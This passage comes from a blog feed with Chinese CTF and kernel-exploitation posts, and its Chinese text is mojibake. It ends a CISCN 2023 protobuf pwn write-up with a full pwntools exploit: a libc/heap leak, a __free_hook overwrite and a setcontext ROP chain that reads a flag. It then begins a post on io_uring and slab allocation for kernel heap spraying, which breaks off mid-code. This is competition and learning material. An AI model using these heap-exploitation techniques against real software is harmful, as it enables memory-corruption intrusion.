extension_ranges=[],</span><br><span class="line">  oneofs=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_start=<span class="number">19</span>,</span><br><span class="line">  serialized_end=<span class="number">101</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DESCRIPTOR.message_types_by_name[<span class="string">&#x27;Devicemsg&#x27;</span>] = _DEVICEMSG</span><br><span class="line">_sym_db.RegisterFileDescriptor(DESCRIPTOR)</span><br><span class="line"></span><br><span class="line">Devicemsg = _reflection.GeneratedProtocolMessageType(<span class="string">&#x27;Devicemsg&#x27;</span>, (_message.Message,), <span class="built_in">dict</span>(</span><br><span class="line">  DESCRIPTOR = _DEVICEMSG,</span><br><span class="line">  __module__ = <span class="string">&#x27;Devicemsg_pb2&#x27;</span></span><br><span class="line">  <span class="comment"># @@protoc_insertion_point(class_scope:Devicemsg)</span></span><br><span class="line">  ))</span><br><span class="line">_sym_db.RegisterMessage(Devicemsg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±åªéœ€è¦æ‹¿ç€è¿™ä¸ªæ–‡ä»¶å»ä½¿ç”¨å³å¯ï¼Œåç»­çš„æ¼æ´åˆ©ç”¨éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†è¯´äº†ã€‚</p><h3 id="ç»¼ä¸Šå¯å¾—ï¼Œexp"><a href="#ç»¼ä¸Šå¯å¾—ï¼Œexp" class="headerlink" title="ç»¼ä¸Šå¯å¾—ï¼Œexp"></a>ç»¼ä¸Šå¯å¾—ï¼Œexp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot" >https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028" >https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://www.jianshu.com/p/a7e88cb17031" >https://www.jianshu.com/p/a7e88cb17031<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å…¶å®åœ¨ä»¥å‰å·²ç»å¤šæ¬¡é‡è§è¿‡&lt;code&gt;protobuf&lt;/code&gt;äº†ï¼Œä½†æ˜¯éƒ½ä¸å¤ªåœ¨æ„å› ä¸ºæ€»æ„Ÿè§‰ä¼šåƒmuslåº“ä¸€æ ·ï¼Œå­˜æ´»ä¸€æ®µæ—¶é—´åå°±æ¶ˆå¤±äº†ã€‚æ‰€</summary>
      
    
    
    
    <category term="pwn" scheme="https://196082.github.io/categories/pwn/"/>
    
    
    <category term="UAF" scheme="https://196082.github.io/tags/UAF/"/>
    
    <category term="protobuf" scheme="https://196082.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>å‘pipe_bufferè¯´yesï¼</title>
    <link href="https://196082.github.io/2023/05/24/pipe-buffer/"/>
    <id>https://196082.github.io/2023/05/24/pipe-buffer/</id>
    <published>2023-05-24T08:39:35.000Z</published>
    <updated>2023-11-29T10:12:19.720Z</updated>
    
    <content type="html"><![CDATA[<p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230510125707322.png"                      alt="image-20230510125707322"                ></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èµ·å› æ˜¯å¢¨æ™šé¸¢å¤§ä½¬çš„ä¸€å¥å›å¤ï¼Œä¸è¿‡æˆ‘è¿™é‡Œè¿˜æ²¡å°è¯•æŒ–æ˜æ–°çš„ä¸œè¥¿ï¼Œæ›´å¤šçš„æ˜¯å¯¹å¢¨æ™šé¸¢ä½¬çš„å†…å®¹åšé€‚åˆè‡ªå·±ç†è§£çš„æ€»ç»“ã€‚å¯ä»¥çœ‹åˆ°æ ‡ç­¾ä¸­è¿˜æœ‰ä¸€ä¸ªä¸Šä¸€ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»çš„<code>io_uring</code>ï¼Œè¿™é‡Œå°±å…ˆè¯´è¯´ã€‚</p><p><del>ä¸‡å­—è­¦å‘Šï¼ï¼ï¼</del></p><h2 id="io-uringåœ¨å †å–·ä¸­çš„å±€é™æ€§"><a href="#io-uringåœ¨å †å–·ä¸­çš„å±€é™æ€§" class="headerlink" title="io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§"></a>io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __io_account_mem(struct user_struct *user, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page_limit, cur_pages, new_pages;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t allow more pages than we can safely lock */</span></span><br><span class="line">page_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">cur_pages = atomic_long_read(&amp;user-&gt;locked_vm);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">new_pages = cur_pages + nr_pages;</span><br><span class="line"><span class="keyword">if</span> (new_pages &gt; page_limit)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125; <span class="keyword">while</span> (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,</span><br><span class="line">  &amp;cur_pages, new_pages));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘è¿›è¡Œä¸€æ¬¡å †å–·è¿‡åï¼Œå¹¶ä½¿ç”¨updateå»ä¿®æ”¹å†…å®¹æ˜¯ä¼šè¿”å›é”™è¯¯-12ï¼Œåˆ™æ˜¯åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>new_page</code>è¶…è¿‡äº†å¯ä»¥å®‰å…¨lockçš„pageæ•°é‡ï¼Œä¹Ÿå°±æ˜¯<code>new_pages &gt; page_limit</code>å¯¼è‡´çš„ã€‚</p><p>è€Œä¸Šé¢è¿™ä¸ªå‡½æ•°æœ€åˆæ˜¯ç”±<code>io_sqe_buffer_register</code>å‡½æ•°è°ƒç”¨çš„ï¼Œæ‰€ä»¥ä¸å¹¸çš„æ˜¯åœ¨å¯¹<code>io_uring</code>è¿›è¡Œåˆ†é…çš„æ—¶å€™å°±è¦å¼€å§‹è€ƒè™‘äº†ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å¹³æ—¶åŠ¨ä¸åŠ¨å°±è¦é¢å¯¹4096æ¬¡ä¹‹ç±»çš„å¤§èŒƒå›´å †å–·æ—¶<code>io_uring</code>å°±æ˜¾å¾—æœ‰ç‚¹å„¿åŠ›ä¸ä»å¿ƒäº†ã€‚</p><p>ä¸è¿‡é™¤äº†ä»¥ä¸Šè¿™æ ·ä¸€ç‚¹ç¼ºç‚¹<code>io_uring</code>çš„è¡¨ç°ä¾æ—§æ˜¯ä»¤äººæ»¡æ„çš„ã€‚</p><h2 id="slabåˆ†é…æºç åˆ†æ"><a href="#slabåˆ†é…æºç åˆ†æ" class="headerlink" title="slabåˆ†é…æºç åˆ†æ"></a>slabåˆ†é…æºç åˆ†æ</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåˆ†é…slabçš„æœºåˆ¶ä¸º<code>buddy system</code>æœºåˆ¶è¿›è¡Œçš„ã€‚è€Œè¿›è¡Œåˆ†é…çš„æœ€ç»ˆå‡½æ•°ä¸º<code>alloc_slab_page</code>å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œå¹¶ä¸”å¤§å®¶éƒ½çŸ¥é“<code>buddy system</code>åˆ†é…æ—¶å¤§å°ä¸º<code>PAGE_SIZE * pow(2,order)</code>ï¼Œæ‰€ä»¥orderçš„ç”±æ¥å°±æ˜¾å¾—å°¤ä¸ºé‡è¦äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">oo_order</span><span class="params">(struct kmem_cache_order_objects x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.x &gt;&gt; OO_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!folio)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">__folio_set_slab(folio);</span><br><span class="line"><span class="comment">/* Make the flag visible before any changes to folio-&gt;mapping */</span></span><br><span class="line">smp_wmb();</span><br><span class="line"><span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨<code>alloc_slab_page</code>å‡½æ•°ä¸­ä½¿ç”¨orderæ˜¯åœ¨ooä¸­ï¼Œè€Œè¿™ä¸ªooè¿™æ—¶<code>kmem_cache</code>ç»“æ„ä½“ä¸­çš„æˆå‘˜ã€‚</p><h3 id="kmem-cache-create-usercopyæµç¨‹"><a href="#kmem-cache-create-usercopyæµç¨‹" class="headerlink" title="kmem_cache_create_usercopyæµç¨‹"></a>kmem_cache_create_usercopyæµç¨‹</h3><p><code>kmem_cache_create_usercopy</code>ç”¨æ¥æ³¨å†Œä¸€ä¸ªcacheï¼Œæ‰€ä»¥ä»–ä¹Ÿä¼šåˆ†é…ä¸€ä¸ªslabä¾›ä»–è‡ªå·±ä½¿ç”¨ï¼Œä¸è¿‡åˆ†é…çš„æ—¶é—´ç‚¹æ˜¯åœ¨è¿™ä¸ªcacheä¸­ç¬¬ä¸€æ¬¡ç”³è¯·objectçš„æ—¶å€™è§¦å‘çš„ã€‚è€Œ<code>kmem_cache_create_usercopy</code>å‡½æ•°ä¸»è¦æ˜¯å¯¹slabçš„åˆå§‹åŒ–ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„<code>order</code>äº†ã€‚</p><p>å› ä¸ºå‰åŠéƒ¨åˆ†çš„å‡½æ•°éƒ½æ²¡æœ‰ç›´æ¥å’Œ<code>order</code>äº§ç”Ÿå…³ç³»ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç»™ä¸€ä¸‹å¤§å®¶è°ƒç”¨è¿ä¸è´´æºç å ç¯‡å¹…äº†ã€‚</p><p><code>kmem_cache_create_usercopy</code>=&gt;<code>create_cache</code>=&gt;<code>__kmem_cache_create</code>=&gt;<code>kmem_cache_open</code>=&gt;<code>calculate_sizes</code></p><h4 id="calculate-sizeså‡½æ•°"><a href="#calculate-sizeså‡½æ•°" class="headerlink" title="calculate_sizeså‡½æ•°"></a>calculate_sizeså‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculate_sizes</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size = s-&gt;object_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">order = calculate_order(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (order)</span><br><span class="line">s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA32)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">s-&gt;oo = oo_make(order, size);</span><br><span class="line">s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°æœ€åè¿™éƒ¨åˆ†å°±æ˜¯å¯¹ooçš„èµ‹å€¼ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“å»<code>calculate_order</code>ç†æ¸…é€»è¾‘ã€‚</p><h4 id="calculate-orderå‡½æ•°"><a href="#calculate-orderå‡½æ•°" class="headerlink" title="calculate_orderå‡½æ•°"></a>calculate_orderå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span 